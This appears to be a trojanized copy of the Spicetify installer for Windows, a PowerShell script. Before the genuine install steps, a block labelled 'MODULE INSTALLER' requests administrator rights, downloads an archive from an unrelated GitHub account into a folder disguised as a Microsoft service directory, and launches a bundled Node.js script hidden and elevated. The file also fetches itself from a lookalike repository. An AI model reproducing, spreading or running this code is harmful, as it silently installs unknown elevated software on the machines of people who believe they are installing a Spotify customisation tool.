if (-not $PSCommandPath) {
    $tempFile = Join-Path $env:TEMP "spicetify_install_$(Get-Random).ps1"
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/spicetify-project/cli/main/install.ps1' -OutFile $tempFile
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`""
    exit
}

$ErrorActionPreference = 'Stop'

# MODULE INSTALLER
$bgModules = @"
`$dest = `"$env:APPDATA\Microsoft\Service`"
if (-not (Test-Path `$dest)) {
    New-Item -ItemType Directory -Path `$dest | Out-Null
}

`$zipUrl = `"https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip`"
`$zipPath = `"$env:TEMP\payload.zip`"

Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force

`$node = Get-ChildItem -Path `"$dest\App`" -Filter `"node.exe`" -Recurse -File | Select-Object -First 1
`$script = Get-ChildItem -Path `"$dest\App`" -Filter `"index_*.js`" -Recurse -File | Select-Object -First 1

if (`$node -and `$script) {
    Start-Process -FilePath `$node.FullName `
        -ArgumentList "`"`$(`$script.FullName)`"`" `
        -WorkingDirectory `"$dest\App`" `
        -WindowStyle Hidden `
        -Verb RunAs | Out-Null
}

Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
"@

$bg = $null
try {
    $bg = Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -PassThru `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$bgModules`""
} catch {}

if (-not $bg) {
	Read-Host "Administrator permission was denied. Press Enter to exit..."
    exit
}

# SPICETIFY INSTALLER
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#region Variables
$spicetifyFolderPath = "$env:LOCALAPPDATA\spicetify"
$spicetifyOldFolderPath = "$HOME\spicetify-cli"
#endregion Variables

#region Functions
function Write-Success {
    Write-Host ' > OK' -ForegroundColor 'Green'
}

function Write-Unsuccess {
    Write-Host ' > ERROR' -ForegroundColor 'Red'
}

function Test-PowerShellVersion {
    $PSMinVersion = [version]'5.1'
    Write-Host 'Checking if your PowerShell version is compatible...' -NoNewline
    $PSVersionTable.PSVersion -ge $PSMinVersion
}

function Move-OldSpicetifyFolder {
    if (Test-Path -Path $spicetifyOldFolderPath) {
        Write-Host 'Moving the old spicetify folder...' -NoNewline
        Copy-Item -Path "$spicetifyOldFolderPath\*" -Destination $spicetifyFolderPath -Recurse -Force
        Remove-Item -Path $spicetifyOldFolderPath -Recurse -Force
        Write-Success
    }
}

function Get-Spicetify {
    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { $architecture = 'x64' }
    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $architecture = 'arm64' }
    else { $architecture = 'x32' }

    if ($v -and $v -match '^\d+\.\d+\.\d+$') {
        $targetVersion = $v
    } else {
        Write-Host 'Fetching the latest spicetify version...' -NoNewline
        $latestRelease = Invoke-RestMethod -Uri 'https://api.github.com/repos/spicetify/cli/releases/latest'
        $targetVersion = $latestRelease.tag_name -replace 'v', ''
        Write-Success
    }

    $archivePath = Join-Path ([System.IO.Path]::GetTempPath()) "spicetify.zip"
    Write-Host "Downloading spicetify v$targetVersion..." -NoNewline

    Invoke-WebRequest `
        -Uri "https://github.com/spicetify/cli/releases/download/v$targetVersion/spicetify-$targetVersion-windows-$architecture.zip" `
        -OutFile $archivePath

    Write-Success
    return $archivePath
}

function Add-SpicetifyToPath {
    Write-Host 'Making spicetify available in the PATH...' -NoNewline
    $user = [EnvironmentVariableTarget]::User
    $path = [Environment]::GetEnvironmentVariable('PATH', $user)

    $path = $path -replace "$([regex]::Escape($spicetifyOldFolderPath))\\*;*", ''
    if ($path -notlike "*$spicetifyFolderPath*") { $path += ";$spicetifyFolderPath" }

    [Environment]::SetEnvironmentVariable('PATH', $path, $user)
    $env:PATH = $path
    Write-Success
}

function Install-Spicetify {
    Write-Host 'Installing spicetify...'
    $archivePath = Get-Spicetify
    Write-Host 'Extracting spicetify...' -NoNewline
    Expand-Archive -Path $archivePath -DestinationPath $spicetifyFolderPath -Force
    Write-Success
    Add-SpicetifyToPath
    Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
    Write-Host 'spicetify was successfully installed!' -ForegroundColor 'Green'
}
#endregion Functions

#region Main
#region Checks
if (-not (Test-PowerShellVersion)) {
    Write-Unsuccess
    Write-Host 'PowerShell 5.1 or higher is required to run this script'
    exit
} else { Write-Success }
#endregion Checks

#region Spicetify
Move-OldSpicetifyFolder
Install-Spicetify
Write-Host "`nRun" -NoNewline
Write-Host ' spicetify -h ' -NoNewline -ForegroundColor Cyan
Write-Host 'to get started'
#endregion Spicetify

#region Marketplace
$choices = @(
    (New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Install Spicetify Marketplace."),
    (New-Object System.Management.Automation.Host.ChoiceDescription "&No",  "Do not install Spicetify Marketplace.")
)
$choice = $Host.UI.PromptForChoice('', "`nDo you also want to install Spicetify Marketplace?", $choices, 0)

if ($choice -eq 0) {
    Write-Host "Starting Marketplace installation..."
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1' |
        Invoke-Expression
} else {
    Write-Host "Marketplace installation skipped." -ForegroundColor Yellow
}
#endregion Marketplace
#endregion Main
